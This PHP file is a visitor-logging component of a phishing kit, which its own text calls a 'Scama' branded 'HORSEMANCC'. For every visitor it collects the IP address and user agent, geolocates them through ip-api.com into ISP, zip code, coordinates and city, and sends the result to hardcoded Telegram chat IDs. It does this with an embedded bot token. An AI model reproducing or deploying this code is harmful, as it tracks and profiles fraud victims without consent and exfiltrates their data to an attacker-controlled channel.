<?php
include "id.php";
$message = "#---------------------------[ HORSEMANCC ]---------------------------#\n<b>Wassup, Horseman  New visit in your Scama 📬</b>\n<code>Ip\n: %s (%s)\nIsp\n: %s\nZip\n: %s\nTimezone\n: %s\nGeolocation\n: %s, %s\nLocation\n: %s, %s(%s), %s\nUserAgent:\n %s</code>\n#---------------------------[ HORSEMANCC ]---------------------------#";
$ip = getenv("REMOTE_ADDR");
$ua = getenv( 'HTTP_USER_AGENT' );
$date = date('d-m-y h:i:s');
$data = @file_get_contents('http://ip-api.com/json/'.trim($ip).'?lang=en');
$json = @json_decode($data, true);
if ($data == false || $json == null || $json['status'] != 'success') {
    $msg = sprintf($message, $ip, $ip, 'null', 'null', 'null', 'null', 'null', 'null', 'null', 'null', 'null', $ua);
} else {
    $msg = sprintf($message, $ip, $ip, $json['isp'], $json['zip'], $json['timezone'], $json['lat'], $json['lon'], $json['city'], $json['regionName'], $json['region'], $json['countryCode'], $ua);
}
foreach($user_ids as $user_id) {
    $result = adafdadfSendMsg($msg, $user_id);
}

function adafdadfSendMsg($msg, $chat_id) {
    $url='https://api.telegram.org/bot5358300681:AAF2B9nb4LZb326A1_ZXp2LPluRypot-G74/sendMessage';
    $datas = array('chat_id' => $chat_id, 'text' => $msg, 'parse_mode' => 'html');
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch,CURLOPT_POSTFIELDS, $datas);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
?>